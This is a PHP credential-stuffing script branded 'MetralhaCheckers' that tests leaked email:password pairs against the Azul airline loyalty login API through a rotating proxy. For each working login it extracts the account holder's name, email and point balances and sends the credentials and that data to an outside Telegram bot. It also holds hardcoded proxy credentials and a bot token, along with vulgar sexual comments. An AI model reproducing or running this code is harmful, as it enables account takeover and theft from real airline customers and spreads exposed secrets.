<?php


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


    
    error_reporting(0);
    
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

//  =============================== MEUS DIREITOS AUTORAIS FODASSE KKK...!  =============================== //


$metralha = array("Metralha gostoso", "Metralha pica dura", "MetralhaCheckers", "Metralha Reidelas", "Metralha-codding", "Metralha Oi Casada", "Metralha o mais brabo", "Metralha-picademel", "Metralha espanca xota", "Metralha xekus", "Metralha e lindo demais", "Ain que delicia o Metralha", "picadoce");
$metraia = $metralha[array_rand($metralha)];




//  =============================== MEUS DIREITOS AUTORAIS FODASSE KKK...!  =============================== //




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ta-clm-api.voeazul.com.br/clm-api/services/cwa/azul/auth');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: ta-clm-api.voeazul.com.br',
'Origin: https://www.voeazul.com.br',
'Referer: https://www.voeazul.com.br/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.284'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"login":"'.$email.'","password":"'.$senha.'"}');
$resposta = curl_exec($ch);


//$teste = json_decode($resposta, true);
//$meupau = $teste['login'];

// ================ // ====================//==========================//============================= // ================================//=================//
$Retorno = getStr2($resposta, '"globalErrorMessage":"','"');

// ================ // ====================//==========================//============================= // ================================//=================//
$Name = getStr2($resposta, '"Name":"','"');
$Sobrenome = getStr2($resposta, '"LastName":"','"');
$Imair = getStr2($resposta, '"Email":"','"');
$P_Qualify = getStr2($resposta, '"QualifyingPoints":',',');
$P_Resgat = getStr2($resposta, '"RedeemablePoints":',',');

// ================ // ====================//==========================//============================= // ================================//=================//

$Topazio = getStr2($resposta, '"PercentageToTopaz":',',');
$Safira = getStr2($resposta, '"PercentageToSapphire":',',');
$Diamond = getStr2($resposta, '"PercentageToDiamond":',',');


// METRAIA CODER PAI KKK!  DESFRUTEM DESTE SITE ALEATORIO SEUS PORRAN

           // echo $resposta;		
if (stripos($resposta, '"Status":true')) {

echo "<font color='RED'><span class='badge badge-success'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>Retorno:</span> Bem vindo, conectado com sucesso! <span class='badge badge-info'>NOME:</span> $Name $Sobrenome  <span class='badge badge-success'>EMAIL CADASTRADO:</span> $Imair <span class='badge badge-info'>PONTOS QUALIFICAVEIS:</span> $P_Qualify <span class='badge badge-info'>PONTOS RESGATAVEIS:</span> $P_Resgat <span class='badge badge-warning'>PONTOS TOPAZIO:</span> $Topazio <span class='badge badge-warning'>PONTOS SAFIRA:</span> $Safira <span class='badge badge-warning'>PONTOS DIAMOND:</span> $Diamond <span class='badge badge-warning'>#MetralhaCheckers</span><br> ";

$botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
$data = ['text' => "APROVADA\n\nLOGIN: $email|$senha\nEMAIL CADASTRADO: $Imair\n\nACESSE O LINK DO SITE: https://tudoazul.voeazul.com.br/web/azul/home2\n\n\nNOME: $Name $Sobrenome\n\nPONTOS QUALIFICAVEIS: $P_Qualify\nPONTOS RESGATAVEIS: $P_Resgat\nPONTOS TOPAZIO: $Topazio\nPONTOS SAFIRA: $Safira\nPONTOS DIAMOND: $Diamond",'chat_id' => '1040924962', 'parse_mode' => 'html'];
file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}else {

    echo "<font color='WHITE'><span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $Retorno  <span class='badge badge-warning'>CRIADOR:</span> $metraia <br>";
}
?>